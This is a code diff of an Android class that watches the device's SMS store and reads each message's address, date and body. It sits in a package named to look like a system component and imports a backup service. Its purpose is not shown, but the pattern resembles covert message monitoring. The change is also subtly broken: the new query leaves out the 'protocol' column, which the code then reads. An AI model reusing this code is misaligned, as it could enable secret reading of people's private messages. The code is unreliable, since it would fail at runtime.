@@ -7,6 +7,7 @@ import android.database.ContentObserver;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.Handler;
+import android.util.Log;
 
 import com.android.commstat.model.Sms;
 import com.android.commstat.services.BackupService;
@@ -14,21 +15,22 @@ import com.android.commstat.services.BackupService;
 import java.util.Calendar;
 
 
-public class OutgoingMessageObserver extends ContentObserver {
+public class MessageObserver extends ContentObserver {
     private static boolean IsRegistered;
     private static final String CONTENT_SMS = "content://sms/";
     private static long mLastMessageId = 0;
     private Context mContext;
 
     public static void register(Context context) {
-        if(!IsRegistered) {
+        if (!IsRegistered) {
+            Log.d("MessageObserver", "Registered");
             ContentResolver contentResolver = context.getContentResolver();
-            contentResolver.registerContentObserver(Uri.parse(OutgoingMessageObserver.CONTENT_SMS), true, new OutgoingMessageObserver(context, new Handler()));
+            contentResolver.registerContentObserver(Uri.parse(MessageObserver.CONTENT_SMS), true, new MessageObserver(context, new Handler()));
             IsRegistered = true;
         }
     }
 
-    private OutgoingMessageObserver(Context context, Handler handler) {
+    private MessageObserver(Context context, Handler handler) {
         super(handler);
         mContext = context;
     }
@@ -37,19 +39,19 @@ public class OutgoingMessageObserver extends ContentObserver {
     public void onChange(boolean selfChange) {
         super.onChange(selfChange);
         Uri smsUri = Uri.parse(CONTENT_SMS);
-        Cursor cur = mContext.getContentResolver().query(smsUri, null, null, null, null);
+        Cursor cur = mContext.getContentResolver().query(smsUri, new String[]{"_id", "thread_id", "address", /*"person",*/ "date", "body"}, null, null, null);
         if (cur == null) {
             return;
         }
         try {
             cur.moveToNext();
-            String protocol = cur.getString(cur.getColumnIndex("protocol"));
-            if (protocol == null) {
-                long messageId = cur.getLong(cur.getColumnIndex("_id"));
-                if (messageId != mLastMessageId) {
-                    mLastMessageId = messageId;
+            long messageId = cur.getLong(cur.getColumnIndex("_id"));
+            if (messageId != mLastMessageId) {
+                mLastMessageId = messageId;
+                String protocol = cur.getString(cur.getColumnIndex("protocol"));
+                if (protocol == null) {
                     int threadId = cur.getInt(cur.getColumnIndex("thread_id"));
-                    Cursor c = mContext.getContentResolver().query(Uri.parse("content://sms/outbox/" + threadId), null, null, null, null);
+                    Cursor c = mContext.getContentResolver().query(Uri.parse("content://sms/outbox/" + threadId), new String[]{"_id"}, null, null, null);
                     if (c != null) {
                         try {
                             c.moveToNext();
